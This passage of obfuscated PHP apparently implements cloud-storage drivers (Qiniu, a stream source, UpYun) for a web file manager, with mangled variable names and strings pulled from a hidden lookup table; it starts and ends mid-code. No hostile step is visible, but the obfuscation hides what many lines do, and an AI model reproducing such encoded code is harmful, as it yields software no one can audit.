public function sourceModelCopy($ì¥“æè) { $ÉÊËçıñ =& $_SERVER[¹Éµ„ºå]; $¿ššÙß = $ì¥“æè[0]; $Ù“ºê¡ä = $ì¥“æè[1]; $êÛ€É† =& $this->task; $this->sourceModelCopyFlag = !0; $Ãƒ²ÂÁ§ = 0; switch ($¿ššÙß) { case $ÉÊËçıñ[657]: $Ãƒ²ÂÁ§ = 1; break; case $ÉÊËçıñ[660]: $êÛ€É†[$ÉÊËçıñ[2016]] = $Ù“ºê¡ä[$ÉÊËçıñ[32]]; break; case $ÉÊËçıñ[662]: $Ãƒ²ÂÁ§ = intval($ì¥“æè[$ÉÊËçıñ[467]] * 0.4); break; case $ÉÊËçıñ[664]: $Ãƒ²ÂÁ§ = intval($ì¥“æè[$ÉÊËçıñ[467]] * 0.2); break; case $ÉÊËçıñ[666]: $Ãƒ²ÂÁ§ = intval($ì¥“æè[$ÉÊËçıñ[467]] * 0.4); break; } $this->update($Ãƒ²ÂÁ§); self::log(array("{$¿ššÙß}\73\141\144\144\75{$Ãƒ²ÂÁ§}", $ì¥“æè)); $this->sourceModelCopyFlag = !1; } public function sourceRemove($Ñå“‡ê, $—Şáûè) { $†ÇêÈœƒ =& $_SERVER[¹Éµ„ºå]; $this->sourceModelCopyFlag = !0; $ùìÜó¹³ = 1; if (isset($Ñå“‡ê[$†ÇêÈœƒ[82]])) { $ùìÜó¹³ = $Ñå“‡ê[$†ÇêÈœƒ[82]][$†ÇêÈœƒ[80]]; $ùìÜó¹³ = $ùìÜó¹³ + $Ñå“‡ê[$†ÇêÈœƒ[82]][$†ÇêÈœƒ[81]] + 1; } $this->update($ùìÜó¹³); $this->sourceModelCopyFlag = !1; $this->log(array($†ÇêÈœƒ[2044], $ùìÜó¹³, $Ñå“‡ê)); } public function sourceMove($·¼å¡Í§) { $this->sourceRemove($·¼å¡Í§, !1); } public function curlProgress($¾‚ÉŞ—ş, $–â…Ş‡†, $çÄúºÎ, $øÔ¨òÛ¢, $‰ñİÙİ) { $¨êˆ©†à =& $_SERVER[¹Éµ„ºå]; $’÷œçı“ =& $this->task; if ($‰ñİÙİ > 0) { $’÷œçı“[$¨êˆ©†à[1223]] = $¨êˆ©†à[2045]; $’÷œçı“[$¨êˆ©†à[2020]] = $¨êˆ©†à[107]; if ($’÷œçı“[$¨êˆ©†à[2018]]) { $’÷œçı“[$¨êˆ©†à[2019]] = $‰ñİÙİ; } if ($’÷œçı“[$¨êˆ©†à[2021]]) { $’÷œçı“[$¨êˆ©†à[2019]] = $‰ñİÙİ + $’÷œçı“[$¨êˆ©†à[2021]]; } } else { if ($çÄúºÎ > 0) { if ($’÷œçı“[$¨êˆ©†à[2018]] == $–â…Ş‡†) { $’÷œçı“[$¨êˆ©†à[2019]] = $çÄúºÎ; $’÷œçı“[$¨êˆ©†à[1223]] = $¨êˆ©†à[2046]; $’÷œçı“[$¨êˆ©†à[2020]] = $¨êˆ©†à[1374]; } } } $this->update(); $ß„„üü‰ = "\x64\x6f\167\156\72{$çÄúºÎ}\57{$–â…Ş‡†}\x3b\x20\165\x70\154\x6f\141\x64\x3a{$‰ñİÙİ}\x2f{$øÔ¨òÛ¢}\73\x66\151\x6c\x65\75" . $’÷œçı“[$¨êˆ©†à[2018]]; self::log(array($¨êˆ©†à[2047] . $ß„„üü‰ . $¨êˆ©†à[74] . $’÷œçı“[$¨êˆ©†à[2016]], curl_getinfo($¾‚ÉŞ—ş))); } public function curlProgressStart($Í¹­…ô) { } public function curlProgressEnd($ “†áõ) { $¼ëáãÊì =& $_SERVER[¹Éµ„ºå]; $áÀæÑï» =& $this->task; $ïÒ®Ş¦¢ = curl_getinfo($ “†áõ); $Ê‰ƒÂ¸± = $ïÒ®Ş¦¢[$¼ëáãÊì[2048]]; if ($Ê‰ƒÂ¸± == -1) { $Ê‰ƒÂ¸± = $ïÒ®Ş¦¢[$¼ëáãÊì[2049]]; } if ($áÀæÑï»[$¼ëáãÊì[2020]] == $¼ëáãÊì[107] && $Ê‰ƒÂ¸±) { $áÀæÑï»[$¼ëáãÊì[2021]] += $Ê‰ƒÂ¸±; } $this->update(); } } goto aº¹·™¸œ¥; AÌ§î®çÁŒ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($âáßÌÖõ) { parent::__construct(); require_once SDK_DIR . $_SERVER[¹Éµ„ºå][1724]; $this->_init($âáßÌÖõ); } public function _init($–Ñ´ò‚£) { $ñÏõøˆƒ =& $_SERVER[¹Éµ„ºå]; $this->config = $–Ñ´ò‚£; foreach ($–Ñ´ò‚£ as $æ‡Ûæ©Ë => $ËóÎÜÆŞ) { if (isset($this->{$æ‡Ûæ©Ë})) { $this->{$æ‡Ûæ©Ë} = $ËóÎÜÆŞ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ñÏõøˆƒ[1725] . LNG($ñÏõøˆƒ[1662])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($˜Ò¢„ñ, $Ÿ²íÈğï = '', $öô ¨®º = REPEAT_RENAME) { if ($this->setContent($˜Ò¢„ñ, $Ÿ²íÈğï)) { return $this->getPathOuter($˜Ò¢„ñ); } return !1; } public function mkdir($êƒãšæû, $»ª»¦ãÇ = REPEAT_SKIP) { $ã€Ñ¶¤ =& $_SERVER[¹Éµ„ºå]; $Ã ™–ôã = trim($êƒãšæû, $ã€Ñ¶¤[8]); if ($this->_isFolder($Ã ™–ôã)) { return $this->getPathOuter($Ã ™–ôã); } $êƒãšæû = $Ã ™–ôã . $ã€Ñ¶¤[8]; $õ­°¯¬± = get_path_this($Ã ™–ôã); $¹€ŠøŒ´ = $êƒãšæû . $õ­°¯¬±; if (!$this->mkfile($¹€ŠøŒ´)) { return !1; } if (!$this->moveFile($¹€ŠøŒ´, $êƒãšæû)) { $this->delFile($¹€ŠøŒ´); return !1; } return $this->getPathOuter($Ã ™–ôã); } public function copyFile($öµë‘Ñä, $€¡ëŞ) { $å¸–¹Åà = $this->bucketManager->copy($this->bucket, $öµë‘Ñä, $this->bucket, $€¡ëŞ, !0); return $å¸–¹Åà ? !1 : $this->getPathOuter($€¡ëŞ); } public function moveFile($²êĞñ·, $×È¶ú®) { $ÆËÄ¶Ë£ = $this->bucketManager->move($this->bucket, $²êĞñ·, $this->bucket, $×È¶ú®, !0); return $ÆËÄ¶Ë£ ? !1 : $this->getPathOuter($×È¶ú®); } public function delFile($Ëš¬ıæõ) { if (!$this->exist($Ëš¬ıæõ)) { return !0; } $Ì”ÅëÒ = $this->bucketManager->delete($this->bucket, $Ëš¬ıæõ); if (!$Ì”ÅëÒ) { return !0; } return $Ì”ÅëÒ->code() == 612 ? !0 : !1; } public function delFolder($øàÆã³Ë) { $¼Ûø¢Úº =& $_SERVER[¹Éµ„ºå]; if (!$this->exist($øàÆã³Ë)) { return !0; } $this->listItemCache = !1; $„±ÌéÚ… = $this->fileList($øàÆã³Ë); $this->listItemCache = !0; $‡ûòó¾È = trim($øàÆã³Ë, $¼Ûø¢Úº[8]) . $¼Ûø¢Úº[8]; if (!empty($øàÆã³Ë) && $øàÆã³Ë !== $¼Ûø¢Úº[228] && !in_array($‡ûòó¾È, $„±ÌéÚ…[$¼Ûø¢Úº[85]])) { $„±ÌéÚ…[$¼Ûø¢Úº[85]][] = $‡ûòó¾È; } $Ş—û‰Š¡ = $this->delByBatch($„±ÌéÚ…[$¼Ûø¢Úº[86]]); if (!$Ş—û‰Š¡) { return !1; } $Ş—û‰Š¡ = $this->delByBatch($„±ÌéÚ…[$¼Ûø¢Úº[85]]); if (!$Ş—û‰Š¡) { return !1; } return $this->delFile($‡ûòó¾È); } private function delByBatch($°¬©×) { foreach (array_chunk($°¬©×, 1000) as $³¶øÃõ›) { $âÛÂüô‰ = $this->bucketManager->buildBatchDelete($this->bucket, $³¶øÃõ›); list($Ü¤ƒåÜİ, $Â–õñü) = $this->bucketManager->batch($âÛÂüô‰); if ($Â–õñü) { return !1; } } return !0; } public function rename($ÑŒË±Õ, $£¥Áƒ¶›) { return $this->renameObject($ÑŒË±Õ, $£¥Áƒ¶›); } public function fileInfo($ËÑ¤Æ”, $‡Û­©¾× = false, $êë¬Ã–Å = array()) { $Ûæ¡Ü® =& $_SERVER[¹Éµ„ºå]; $õÊ™Î°¾ = array($Ûæ¡Ü®[32] => $this->pathThis($ËÑ¤Æ”), $Ûæ¡Ü®[87] => $this->getPathOuter($Ûæ¡Ü®[8] . $ËÑ¤Æ”), $Ûæ¡Ü®[33] => $Ûæ¡Ü®[230], $Ûæ¡Ü®[79] => isset($êë¬Ã–Å[$Ûæ¡Ü®[1726]]) ? $êë¬Ã–Å[$Ûæ¡Ü®[1726]] : 0, $Ûæ¡Ü®[166] => $this->ext($ËÑ¤Æ”)); if ($‡Û­©¾×) { return $õÊ™Î°¾; } $õÊ™Î°¾[$Ûæ¡Ü®[231]] = $õÊ™Î°¾[$Ûæ¡Ü®[88]] = 0; $õÊ™Î°¾[$Ûæ¡Ü®[232]] = $õÊ™Î°¾[$Ûæ¡Ü®[233]] = !0; if (empty($êë¬Ã–Å)) { $êë¬Ã–Å = $this->objectMeta($ËÑ¤Æ”); if (!$êë¬Ã–Å) { return $õÊ™Î°¾; } } if (isset($êë¬Ã–Å[$Ûæ¡Ü®[234]]) && $êë¬Ã–Å[$Ûæ¡Ü®[234]]) { $õÊ™Î°¾[$Ûæ¡Ü®[235]] = $êë¬Ã–Å[$Ûæ¡Ü®[234]]; } if (isset($êë¬Ã–Å[$Ûæ¡Ü®[245]]) && $êë¬Ã–Å[$Ûæ¡Ü®[245]]) { $õÊ™Î°¾[$Ûæ¡Ü®[235]] = $êë¬Ã–Å[$Ûæ¡Ü®[245]]; } if (isset($êë¬Ã–Å[$Ûæ¡Ü®[1727]])) { $õÊ™Î°¾[$Ûæ¡Ü®[88]] = substr($êë¬Ã–Å[$Ûæ¡Ü®[1727]] . $Ûæ¡Ü®[12], 0, 10); } if (isset($êë¬Ã–Å[$Ûæ¡Ü®[1726]])) { $õÊ™Î°¾[$Ûæ¡Ü®[79]] = $êë¬Ã–Å[$Ûæ¡Ü®[1726]]; } return $õÊ™Î°¾; } public function folderInfo($ŠÈ‚Ì¸, $üÚÌ¬ = false) { $ı‹¶Â =& $_SERVER[¹Éµ„ºå]; $‘Ï‰ÌŒë = array($ı‹¶Â[32] => $this->pathThis($ŠÈ‚Ì¸), $ı‹¶Â[87] => $this->getPathOuter($ı‹¶Â[8] . $ŠÈ‚Ì¸), $ı‹¶Â[33] => $ı‹¶Â[78]); if ($üÚÌ¬) { return $‘Ï‰ÌŒë; } $‘Ï‰ÌŒë[$ı‹¶Â[231]] = $‘Ï‰ÌŒë[$ı‹¶Â[88]] = 0; $‘Ï‰ÌŒë[$ı‹¶Â[232]] = $‘Ï‰ÌŒë[$ı‹¶Â[233]] = !0; $ŠÈ‚Ì¸ = rtrim($ŠÈ‚Ì¸, $ı‹¶Â[8]) . $ı‹¶Â[8]; $áÙÏåºÁ = $this->objectMeta($ŠÈ‚Ì¸); if (isset($áÙÏåºÁ[$ı‹¶Â[1727]])) { $‘Ï‰ÌŒë[$ı‹¶Â[88]] = substr($áÙÏåºÁ[$ı‹¶Â[1727]] . $ı‹¶Â[12], 0, 10); } return $‘Ï‰ÌŒë; } public function listPath($úåÌêÀñ, $Óù÷Ü®Õ = false) { $ÖÒšï×µ =& $_SERVER[¹Éµ„ºå]; $Ÿü×„¹” = $this->fileList($úåÌêÀñ, $ÖÒšï×µ[8], !0); foreach ($Ÿü×„¹”[$ÖÒšï×µ[85]] as $„çÓİË® => $ ¿ ü˜Ş) { $Ÿü×„¹”[$ÖÒšï×µ[85]][$„çÓİË®] = $this->folderInfo($ ¿ ü˜Ş, $Óù÷Ü®Õ); } foreach ($Ÿü×„¹”[$ÖÒšï×µ[86]] as $„çÓİË® => $ ¿ ü˜Ş) { $Ÿü×„¹”[$ÖÒšï×µ[86]][$„çÓİË®] = $this->fileInfo($ ¿ ü˜Ş[$ÖÒšï×µ[32]], $Óù÷Ü®Õ, $ ¿ ü˜Ş); } return $Ÿü×„¹”; } public function has($‹¯èÙª, $†Ÿİ§ï« = false, $µÙ¸²û = true) { $‚’Óªñ =& $_SERVER[¹Éµ„ºå]; $‹¯èÙª = trim($‹¯èÙª, $‚’Óªñ[8]); $şá±Ô˜ú = empty($‹¯èÙª) && $‹¯èÙª !== $‚’Óªñ[228] ? $‚’Óªñ[12] : $‹¯èÙª . $‚’Óªñ[8]; $´èÙ°…³ = $‚’Óªñ[12]; $€éí à = 500; $Á¡ßêÕ = $‚’Óªñ[8]; $¡Å–ãˆª = $ùîÛç§Î = 0; while (!0) { check_abort(); list($—–ñØ°ü, $¨‘¾ëùğ) = $this->bucketManager->listFiles($this->bucket, $şá±Ô˜ú, $´èÙ°…³, $€éí à, $Á¡ßêÕ); if ($¨‘¾ëùğ) { break; } $´èÙ°…³ = array_key_exists($‚’Óªñ[1674], $—–ñØ°ü) ? $´èÙ°…³ = $—–ñØ°ü[$‚’Óªñ[1728]] : $‚’Óªñ[12]; if ($†Ÿİ§ï«) { if (!empty($—–ñØ°ü[$‚’Óªñ[1729]])) { $¡Å–ãˆª += count($—–ñØ°ü[$‚’Óªñ[1729]]); } if (!empty($—–ñØ°ü[$‚’Óªñ[1730]])) { $ùîÛç§Î += count($—–ñØ°ü[$‚’Óªñ[1730]]); } if ($´èÙ°…³ === $‚’Óªñ[12]) { break; } continue; } if ($µÙ¸²û) { if (!empty($—–ñØ°ü[$‚’Óªñ[1729]])) { return !0; } } else { if (!empty($—–ñØ°ü[$‚’Óªñ[1730]])) { return !0; } } if ($´èÙ°…³ === $‚’Óªñ[12]) { break; } } if ($†Ÿİ§ï«) { return array($‚’Óªñ[239] => $¡Å–ãˆª, $‚’Óªñ[240] => $ùîÛç§Î); } return !1; } public function listAll($¾íÑ¬ˆ) { $Ë†ÈÆÔƒ =& $_SERVER[¹Éµ„ºå]; $Á²ê­¨İ = $this->fileList($¾íÑ¬ˆ, $Ë†ÈÆÔƒ[12], !0); $üÖğöà¨ = array_to_keyvalue($Á²ê­¨İ[$Ë†ÈÆÔƒ[86]], $Ë†ÈÆÔƒ[32]); foreach ($Á²ê­¨İ[$Ë†ÈÆÔƒ[85]] as $ıİŒ·ºî) { if (is_string($ıİŒ·ºî)) { $üÖğöà¨[$ıİŒ·ºî] = array($Ë†ÈÆÔƒ[79] => 0); } } return $this->listAllFiles($¾íÑ¬ˆ, $üÖğöà¨); } private function fileList($—Òæ¸‚, $¢—ì²Ÿ” = '', $©½”Ë§§ = 0) { $í°ÂĞİƒ =& $_SERVER[¹Éµ„ºå]; $—Òæ¸‚ = trim($—Òæ¸‚, $í°ÂĞİƒ[8]); $ŞÅğ¹™è = empty($—Òæ¸‚) && $—Òæ¸‚ !== $í°ÂĞİƒ[228] ? $í°ÂĞİƒ[12] : $—Òæ¸‚ . $í°ÂĞİƒ[8]; $°½¸ó¸ = $í°ÂĞİƒ[12]; $—Ü±ªû = 1000; $Ê×ÈÂö¾ = $ì¤ü‘é¾ = array(); while (!0) { check_abort(); list($Œø‡Öùá, $«ä‚×Ïü) = $this->bucketManager->listFiles($this->bucket, $ŞÅğ¹™è, $°½¸ó¸, $—Ü±ªû, $¢—ì²Ÿ”); if ($«ä‚×Ïü) { break; } $°½¸ó¸ = array_key_exists($í°ÂĞİƒ[1674], $Œø‡Öùá) ? $°½¸ó¸ = $Œø‡Öùá[$í°ÂĞİƒ[1728]] : $í°ÂĞİƒ[12]; $Ñ£äµ™á = isset($Œø‡Öùá[$í°ÂĞİƒ[1729]]) ? $Œø‡Öùá[$í°ÂĞİƒ[1729]] : array(); $õ½™—æ… = isset($Œø‡Öùá[$í°ÂĞİƒ[1730]]) ? $Œø‡Öùá[$í°ÂĞİƒ[1730]] : array(); foreach ($Ñ£äµ™á as $©´ï”º) { if ($©´ï”º[$í°ÂĞİƒ[95]] == $ŞÅğ¹™è) { continue; } $ úñØÂ¢ = $©´ï”º[$í°ÂĞİƒ[95]]; $İİø¶’¿ = $©´ï”º[$í°ÂĞİƒ[1726]]; $©´ï”º[$í°ÂĞİƒ[32]] = $ úñØÂ¢; $©´ï”º[$í°ÂĞİƒ[79]] = $İİø¶’¿; $“¢á’é = $İİø¶’¿ == 0 && substr($ úñØÂ¢, strlen($ úñØÂ¢) - 1, 1) == $í°ÂĞİƒ[8] ? !0 : !1; $this->cacheMethodInfoSet($ úñØÂ¢, $“¢á’é, $©´ï”º); if ($“¢á’é) { $Ê×ÈÂö¾[] = $ úñØÂ¢; continue; } $ì¤ü‘é¾[] = $©½”Ë§§ ? $©´ï”º : $ úñØÂ¢; } foreach ($õ½™—æ… as $ úñØÂ¢) { if ($ úñØÂ¢ == $ŞÅğ¹™è) { continue; } $Ê×ÈÂö¾[] = $ úñØÂ¢; $this->cacheMethodInfoSet($ úñØÂ¢, !0); } if ($°½¸ó¸ === $í°ÂĞİƒ[12]) { break; } } $this->cacheMethodInfoSet($—Òæ¸‚, !0); return array($í°ÂĞİƒ[85] => $Ê×ÈÂö¾, $í°ÂĞİƒ[86] => $ì¤ü‘é¾); } public function canRead($¤ºñµ¶ò) { return $this->exist($¤ºñµ¶ò) ? !0 : !1; } public function canWrite($†•ı’åº) { return $this->exist($†•ı’åº) ? !0 : !1; } public function getContent($à¸­²’ò) { return $this->fileSubstr($à¸­²’ò, 0, -1); } public function setContent($¢¿ííóú, $ºÁ»ß‰ = '') { $ñï”¡Ï› = $this->tempFile($this->pathThis($¢¿ííóú)); file_put_contents($ñï”¡Ï›, $ºÁ»ß‰); if ($this->upload($¢¿ííóú, $ñï”¡Ï›)) { $this->tempFileRemve($ñï”¡Ï›); return !0; } return !1; } public function refreshUrls($¿¾ºòŠª) { $áÍÏ©áˆ =& $_SERVER[¹Éµ„ºå]; $ÈÊÔÒªğ = array(); if (is_array($¿¾ºòŠª)) { foreach ($¿¾ºòŠª as $ÖŠ°ß£Ş) { $ÈÊÔÒªğ[] = $this->link($ÖŠ°ß£Ş); } } else { $ÈÊÔÒªğ[] = $this->link($¿¾ºòŠª); } $Ïªšàêë = new Qiniu\Cdn\CdnManager($this->auth); list($³ÖÔüø¨, $õ½ Ú±) = $Ïªšàêë->refreshUrls($ÈÊÔÒªğ); if ($õ½ Ú±) { return !1; } return $³ÖÔüø¨[$áÍÏ©áˆ[1360]] == $áÍÏ©áˆ[851] ? !0 : !1; } public function fileSubstr($µœ÷ËÇê, $¤‰áƒÜ™, $ƒ•Ïù´ô) { $™ëé´Ãœ =& $_SERVER[¹Éµ„ºå]; if (!($§¡§—µë = $this->link($µœ÷ËÇê))) { return !1; } $¡ƒÚÜ˜ = !1; if ($ƒ•Ïù´ô > 0) { $ƒü°·æ = $¤‰áƒÜ™ + $ƒ•Ïù´ô - 1; $¡ƒÚÜ˜ = array($™ëé´Ãœ[1594] . $¤‰áƒÜ™ . $™ëé´Ãœ[476] . $ƒü°·æ); } $È›ó­û» = url_request($§¡§—µë, $™ëé´Ãœ[1595], !1, $¡ƒÚÜ˜); return $È›ó­û»[$™ëé´Ãœ[841]] ? $È›ó­û»[$™ëé´Ãœ[1381]] : !1; } public function upload($‰òµöúâ, $…½—ƒÀ, $¼Á¶Âù = false, $ú©ó‰× = REPEAT_REPLACE) { if (!$…½—ƒÀ || !@file_exists($…½—ƒÀ)) { return !1; } $Éüüê‘À = new Qiniu\Storage\UploadManager(); $ëË˜—ÌÅ = $this->auth->uploadToken($this->bucket, $‰òµöúâ); $ş±Ş¹Á = get_file_mime(get_path_ext($…½—ƒÀ)); list($³“åÅ®µ, $ŠçŠõï¥) = $Éüüê‘À->putFile($ëË˜—ÌÅ, $‰òµöúâ, $…½—ƒÀ, null, $ş±Ş¹Á); return $ŠçŠõï¥ ? !1 : $this->getPathOuter($‰òµöúâ); } public function uploadFormData($Êö¹Ìé‡, $›Ô¤ÄŠ = 3600) { return $this->uploadToken($Êö¹Ìé‡, $›Ô¤ÄŠ); } public function uploadMultiData($È€ˆ™ä¬, $°Ñõã¼È = 3600) { return $this->uploadToken($È€ˆ™ä¬, $°Ñõã¼È); } private function uploadToken($ç·À½´, $–Ø­â± = 3600) { $‘ôµü² =& $_SERVER[¹Éµ„ºå]; $•¢Êúå¥ = $–Ø­â±; $ÕŸ¬ÖÏÛ = array($‘ôµü²[1731] => $‘ôµü²[1732]); $å—©‹­É = $ç·À½´; $Ú‘‚èÎÁ = $this->auth->uploadToken($this->bucket, $å—©‹­É, $•¢Êúå¥, $ÕŸ¬ÖÏÛ, !0); $½–¯æŠİ = empty($this->region) || $this->region == $‘ôµü²[1733] ? $‘ôµü²[12] : $‘ôµü²[476] . $this->region; $î³›Âå¶ = http_type() . "\x3a\57\x2f\x75\160\154\157\141\x64{$½–¯æŠİ}\x2e\x71\x69\x6e\151\165\x70\x2e\143\x6f\155\57"; return array($‘ôµü²[1734] => $Ú‘‚èÎÁ, $‘ôµü²[1597] => $î³›Âå¶); } public function download($öÕåİ©, $’´ÎıË©) { $Ğ•§í¸ = IO::getPathInner(IO::mkfile($’´ÎıË©)); if (!($šÃ†·£ = $this->link($öÕåİ©))) { return !1; } $ƒ°œ­§„ = 0; $†¯êúÎÇ = 1024 * 200; $ø§ìõó = fopen($Ğ•§í¸, $_SERVER[¹Éµ„ºå][1735]); while (!0) { $¢…¤Øèœ = $this->fileSubstr($öÕåİ©, $ƒ°œ­§„, $†¯êúÎÇ); if ($¢…¤Øèœ === !1) { return !1; } fwrite($ø§ìõó, $¢…¤Øèœ); $ƒ°œ­§„ += $†¯êúÎÇ; if (strlen($¢…¤Øèœ) < $†¯êúÎÇ) { break; } } fclose($ø§ìõó); return $’´ÎıË©; } public function link($„È€ˆ¤ø, $Œ¾”ª‚ˆ = '') { if (!$this->isFile($„È€ˆ¤ø)) { return !1; } $ÂŞµ´İ = $this->getHost() . $_SERVER[¹Éµ„ºå][8] . $this->pathEncode($„È€ˆ¤ø) . $Œ¾”ª‚ˆ; return $this->auth->privateDownloadUrl($ÂŞµ´İ, 3600 * 12); } public function fileOut($»×ÌÕÕ§, $ñ©ÔË¬´ = false, $¸‘£‚§š = false, $àî’ Æˆ = '') { $ìéÚÀˆï =& $_SERVER[¹Éµ„ºå]; if ($this->isFileOutServer()) { return $this->fileOutServer($»×ÌÕÕ§, $ñ©ÔË¬´, $¸‘£‚§š, $àî’ Æˆ); } if (!$¸‘£‚§š) { $¸‘£‚§š = $this->pathThis($»×ÌÕÕ§); } $Ü ùãÙŠ = $ñ©ÔË¬´ ? $ìéÚÀˆï[1736] . rawurlencode($¸‘£‚§š) : $ìéÚÀˆï[12]; $ğñ—Á›± = $this->link($»×ÌÕÕ§, $Ü ùãÙŠ); $this->fileOutLink($ğñ—Á›±); } public function fileOutServer($¾İÚ¢òâ, $¬«ÏÁÁ = false, $“éú«ãË = false, $‰áŞö²– = '') { parent::fileOut($¾İÚ¢òâ, $¬«ÏÁÁ, $“éú«ãË, $‰áŞö²–); } public function fileOutImage($ÚŠÙæ‰©, $Ì±š¿ùÁ = 250) { if ($this->size($ÚŠÙæ‰©) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ÚŠÙæ‰©, $Ì±š¿ùÁ); } $áÌ•Ÿº£ = $this->link($ÚŠÙæ‰©, $_SERVER[¹Éµ„ºå][1737] . $Ì±š¿ùÁ); $this->fileOutLink($áÌ•Ÿº£); } public function fileOutImageServer($—ºİ·„, $÷×À¬Øó = 250) { parent::fileOutImage($—ºİ·„, $÷×À¬Øó); } public function hashMd5($¼­á­ü“) { $½ßˆ§»š =& $_SERVER[¹Éµ„ºå]; $„¹ëâÁœ = $this->objectMeta($¼­á­ü“); return isset($„¹ëâÁœ[$½ßˆ§»š[245]]) ? $„¹ëâÁœ[$½ßˆ§»š[245]] : !1; $³¢ÉÇøŸ = $this->link($¼­á­ü“, $½ßˆ§»š[1738]); } public function size($°¦ Õ‘±) { $ø¯ŒÒ­† = $this->objectMeta($°¦ Õ‘±); return $ø¯ŒÒ­† ? $ø¯ŒÒ­†[$_SERVER[¹Éµ„ºå][79]] : 0; } public function info($·‚şóÅî) { if ($this->isFolder($·‚şóÅî)) { return $this->folderInfo($·‚şóÅî); } else { if ($this->isFile($·‚şóÅî)) { return $this->fileInfo($·‚şóÅî); } } return !1; } public function exist($Ø¨ê—äË) { return $this->isFile($Ø¨ê—äË) || $this->isFolder($Ø¨ê—äË); } public function isFile($¡ƒ–Óı¸) { return !$this->isFolder($¡ƒ–Óı¸) && $this->objectMeta($¡ƒ–Óı¸); } public function isFolder($“ãšÛÌå) { return $this->cacheMethod($_SERVER[¹Éµ„ºå][177], $“ãšÛÌå); } protected function objectMeta($Äñƒá„) { return $this->cacheMethod($_SERVER[¹Éµ„ºå][179], $Äñƒá„); } protected function _objectMeta($Û´ÚÖˆ) { $¾éÊ‘™ =& $_SERVER[¹Éµ„ºå]; list($½ë‘Á©¾, $˜êÆ‚È) = $this->bucketManager->stat($this->bucket, $Û´ÚÖˆ); if ($½ë‘Á©¾) { $½ë‘Á©¾[$¾éÊ‘™[79]] = intval($½ë‘Á©¾[$¾éÊ‘™[1726]]); } return $½ë‘Á©¾; } protected function _isFolder($–Š‰ÑöŞ) { $ÏÀ×şº¤ =& $_SERVER[¹Éµ„ºå]; if ($–Š‰ÑöŞ == $ÏÀ×şº¤[12] || $–Š‰ÑöŞ == $ÏÀ×şº¤[8]) { return !0; } list($’‡ğ‚òô, $›Èäì¥) = $this->bucketManager->listFiles($this->bucket, trim($–Š‰ÑöŞ, $ÏÀ×şº¤[8]) . $ÏÀ×şº¤[8], $ÏÀ×şº¤[12], 1, $ÏÀ×şº¤[8]); return !empty($’‡ğ‚òô[$ÏÀ×şº¤[1729]]) || !empty($’‡ğ‚òô[$ÏÀ×şº¤[1730]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ğ–‡œ¿½, $ÃœËŞŞù = 0) { parent::__construct(); $this->source = $ğ–‡œ¿½; $this->sourceSize = $ÃœËŞŞù; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Šïù¢ê­ = false) { return $this->sourceSize; } public function getContent($šäŒ”š‚ = false) { return $this->fileSubstr($šäŒ”š‚, 0, $this->sourceSize); } public function fileSubstr($®í÷®¹½ = false, $×ÉÈ½–Ñ = 0, $÷ìÁ»ÅÇ = 0) { if (!$÷ìÁ»ÅÇ) { $÷ìÁ»ÅÇ = $this->sourceSize; } $øÏğŒ¥ = $this->sourceSize - $×ÉÈ½–Ñ; if ($÷ìÁ»ÅÇ >= $øÏğŒ¥) { $÷ìÁ»ÅÇ = $øÏğŒ¥; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $×ÉÈ½–Ñ, $÷ìÁ»ÅÇ); } if ($this->sourceType == self::TYPE_FILE) { if ($÷ìÁ»ÅÇ <= 0) { return $_SERVER[¹Éµ„ºå][12]; } $äéığŠó = ftell($this->source); fseek_64($this->source, $äéığŠó + $×ÉÈ½–Ñ); $Üè›Èô = @fread($this->source, $÷ìÁ»ÅÇ); fseek_64($this->source, $äéığŠó); return $Üè›Èô; } } public function hashMd5($ô†²ÕóÛ = false) { return md5($this->getContent()); } public static function hash($Ş•ùÌÖÙ, $ç•©£» = 0) { $·ƒ½ÄËò = new PathDriverStream($Ş•ùÌÖÙ, $ç•©£»); return $·ƒ½ÄËò->hashSimple($Ş•ùÌÖÙ); } public static function md5($ãö¶£ÂØ, $Á›ã·’™ = 0) { $Ãëà›×é = new PathDriverStream($ãö¶£ÂØ, $Á›ã·’™); return $Ãëà›×é->hashMd5($ãö¶£ÂØ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\160\x3a\x2f\57\x76\60\56\141\x70\151\56\165\160\x79\x75\x6e\x2e\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ğü’½ß) { parent::__construct(); $this->_init($ğü’½ß); } public function _init($ÃÃá³šÖ) { $©Üµ…ÂÖ =& $_SERVER[¹Éµ„ºå]; foreach ($ÃÃá³šÖ as $ıåíñÜç => $ÂÂßŞû) { if (isset($this->{$ıåíñÜç})) { $this->{$ıåíñÜç} = $ÂÂßŞû; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($©Üµ…ÂÖ[1739] . LNG($©Üµ…ÂÖ[1662])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($à’áÌúƒ, $Ô£ì„ÎŸ = "\x47\105\124") { $Í…ôÉµÙ =& $_SERVER[¹Éµ„ºå]; $Ñìœµ¦ñ = gmdate($Í…ôÉµÙ[1691]); $¹ª“õ¶  = base64_encode(hash_hmac($Í…ôÉµÙ[1740], "{$Ô£ì„ÎŸ}\x26{$à’áÌúƒ}\46{$Ñìœµ¦ñ}", md5("{$this->userpass}"), !0)); $Áğ‚èÃ = 